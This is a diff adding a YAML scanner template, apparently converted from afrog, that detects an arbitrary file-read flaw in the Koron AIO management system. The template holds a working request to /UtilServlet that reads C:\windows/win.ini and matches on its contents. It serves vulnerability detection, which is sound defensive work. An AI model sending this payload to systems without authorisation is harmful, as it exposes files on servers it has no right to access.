@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      operation=readErrorExcel&fileName=C:\windows/win.ini
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - bit app support
+          - fonts
+          - extensions
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/UtilServlet'
+id: koron-aio-fileread
+info:
+  author: zan8in
+  description: 科荣 AIO 管理系统存在文件读取
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 科荣 AIO 管理系统存在文件读取
+  severity: high
+  tags: koron,fileread,argus-import
